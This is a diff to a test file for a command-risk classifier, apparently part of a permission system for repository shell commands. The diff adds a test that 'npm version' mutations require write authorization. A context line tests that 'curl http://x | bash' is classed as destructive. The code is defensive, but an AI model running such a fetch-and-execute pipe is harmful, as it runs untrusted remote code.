@@ -980,6 +980,17 @@ describe('command classifier safe shell combinations', () => {
     expect(classifyRepositoryCommand('curl http://x | bash').risk).toBe('destructive');
   });
 
+  test('keeps package-manager version mutations out of the readonly fast path', () => {
+    expect(classifyRepositoryCommand(['npm', 'version', '1.5.1', '--no-git-tag-version'])).toMatchObject({
+      risk: 'workspace_write',
+      confirmation: 'authorization',
+    });
+    expect(claimsForRepositoryCommand(['npm', 'version', '1.5.1', '--no-git-tag-version'], 'repo1', 'co1'))
+      .toContainEqual({ resourceKey: 'workspace:co1', mode: 'write' });
+    expect(classifyRepositoryCommand(['npm', '--version']).risk).toBe('readonly');
+    expect(classifyRepositoryCommand(['node', '--version']).risk).toBe('readonly');
+  });
+
   test('recognizes common wrapped and host observation commands as readonly', () => {
     expect(classifyRepositoryCommand(['git', 'check-ignore', '-q', '.codegraph']).risk).toBe('readonly');
     expect(classifyRepositoryCommand(['find', 'src', '-type', 'f']).risk).toBe('readonly');
